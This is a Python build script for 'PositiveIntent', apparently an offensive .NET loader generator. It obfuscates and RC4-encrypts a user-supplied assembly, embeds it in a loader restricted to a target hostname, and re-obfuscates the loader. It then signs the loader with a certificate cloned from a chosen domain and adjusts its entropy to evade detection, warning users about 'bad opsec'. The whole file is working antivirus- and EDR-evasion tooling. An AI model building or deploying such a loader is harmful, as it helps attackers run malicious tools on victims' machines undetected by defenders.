import sys
import time
import argparse
import random
import shutil
import traceback
import string
import tempfile
import subprocess
import os
import colorama
import xml.etree.ElementTree as ET

import update
import rc4
import entropy
import sign

CURRENT_SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))

def build(tmp_dir, assembly_name):

    assembly_output_path = os.path.normpath(os.path.join(tmp_dir, f"PositiveIntent/bin/Release/net451/{assembly_name}.exe"))
    solution_path = os.path.normpath(os.path.join(tmp_dir, "PositiveIntent/PositiveIntent.sln"))
    resources_directory_path = os.path.normpath(os.path.join(tmp_dir, "PositiveIntent/Resources"))
    resources_file_path = os.path.normpath(os.path.join(tmp_dir, "PositiveIntent/Properties/Resources.resx"))

    print(colorama.Fore.YELLOW + "[*] " + colorama.Style.RESET_ALL + f'Building loader...please hold.')
    subprocess.run(["docker", "run", "--rm", "-it", "-v", f"{tmp_dir}:/tmp", "-w", "/tmp", "mono", "/usr/bin/msbuild", f"/tmp/PositiveIntent/PositiveIntent.sln", "-r:true", "-p:Configuration=Release"], check=True, stdout = subprocess.DEVNULL)
    
    return assembly_name

def main():
    if sys.platform == 'win32':
        colorama.init()
    
    num_chunks = random.randint(10, 30)
    
    # parse arguments
    parser = argparse.ArgumentParser(description='PositiveIntent .NET Loader')
    parser.add_argument('--file', type=argparse.FileType('rb'),
                        required=True, help='Path to your .NET assembly (e.g. Seeker.exe).')
    parser.add_argument('--hostname', type=str, required=True,
                        help='Restrict execution of loader to hostname.')
    parser.add_argument('--domain', type=str, required=True,
                        help='Domain to copy certificate from. Used to generate a self-signed certificate and digitally sign the loader.')
    parser.add_argument('--args', type=str, required=False,
                        help='Hardcoded arguments to be passed to your assembly. Useful to avoid passing signatured arguments on the command line.')
    parser.add_argument('--writetofile', action='store_true', required=False,
                        help='Redirect output of assembly to encrypted file (C:/Windows/Temp/log.txt). Useful to avoid outputting signatured text to console (e.g. tool logos).')
    args = parser.parse_args()
   
    with tempfile.TemporaryDirectory() as tmp_dir:
        # copy user-provided assembly to temp directory (mounted later for docker)
        shutil.copy2(args.file.name, tmp_dir)

        # parse args
        try:
            if not args.args or not args.writetofile:
                while True:
                    response = input(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f"You aren't using --args and --writetofile. This is bad opsec. Are you sure you want to proceed? (Y/N): ")
                    if response.strip().lower() in ['n', 'no']:
                        sys.exit(-1)
                    elif response.strip().lower() in ['y', 'yes']:
                        break
            
            if(args.args and not args.writetofile):
                assembly_name, key = update.run(tmp_dir, args.hostname, num_chunks, args.args, None)
            elif(args.writetofile and not args.args):
                assembly_name, key = update.run(tmp_dir, args.hostname, num_chunks, None, args.writetofile)
            elif(args.args and args.writetofile):
                assembly_name, key = update.run(tmp_dir, args.hostname, num_chunks, args.args, args.writetofile)
            else:
                assembly_name, key = update.run(tmp_dir, args.hostname, num_chunks, None, None)

            print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Updated loader source files')
        except Exception as exception:
            print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to update loader source files')
            print(traceback.print_exc())
            sys.exit(-1)

        # obfuscate user-provided assembly
        try:
            subprocess.run(["docker", "run", "--rm", "-it", "-v", f"{tmp_dir}:/tmp", "-w", "/tmp", "mono", "/usr/bin/mono", "/tmp/NetFuscator/NetFuscator.exe", f"/tmp/{os.path.basename(args.file.name)}"], check=True, stdout = subprocess.DEVNULL)
            print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Obfuscated {os.path.basename(args.file.name)}")
        except Exception as exception:
            print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to obfuscate {os.path.basename(args.file.name)}')
            print(traceback.print_exc())
            sys.exit(-1)

        # encrypt and embed user-provided assembly
        try:
            rc4.run(tmp_dir, os.path.normpath(os.path.join(tmp_dir, f"obfuscated_{os.path.basename(args.file.name)}")), num_chunks, key.encode('utf-8'))
            print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Encrypted and embedded {os.path.basename(args.file.name)} as a resource file")
            if(args.writetofile):
                print(colorama.Fore.BLUE + "[*] " + colorama.Style.RESET_ALL + f"Your decryption key is {key}")
        except Exception as exception:
            print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to encrypt and embed .NET assembly')
            print(traceback.print_exc())
            sys.exit(-1)

        # build loader and adjust entropy
        assembly_output_path = os.path.normpath(os.path.join(tmp_dir, f"PositiveIntent/bin/Release/net451/{assembly_name}.exe"))
        try:
            build(tmp_dir, assembly_name)
        except Exception as exception:
            print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to build loader.')
            print(traceback.print_exc())
            sys.exit(-1)
        
        # obfuscate loader
        try:
            subprocess.run(["docker", "run", "--rm", "-v", f"{tmp_dir}:/tmp", "-w", "/tmp", "mono", "/usr/bin/mono", "/tmp/NetFuscator/NetFuscator.exe", f"/tmp/PositiveIntent/bin/Release/net451/{assembly_name}.exe", "/tmp/PositiveIntent/Resources"], check=True, stdout = subprocess.DEVNULL)
            print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + "Obfuscated loader")
        except Exception as exception:
            print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to obfuscate loader.')
            print(traceback.print_exc())
            sys.exit(-1)

        # self-sign loader
        try:
            sign.run(tmp_dir, args.domain, assembly_name)
            print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Self-signed loader with certificate cloned from {args.domain}')
        except Exception as exception:
            print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to self-sign loader')
            print(traceback.print_exc())
            sys.exit(-1)

        # check final entropy of assembly
        shannon_entropy = entropy.run(os.path.normpath(os.path.join(os.getcwd(), f"{assembly_name}.exe")))
        if(shannon_entropy > 5.50 or shannon_entropy < 4.50):
            print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to normalize entropy. Entropy of loader: {shannon_entropy}. You can still run the loader at your own risk.')
        else:
            print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Adjusted entropy of loader to: {shannon_entropy}')

        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Loader compiled to {assembly_name}.exe')

if __name__ == "__main__":
    main()
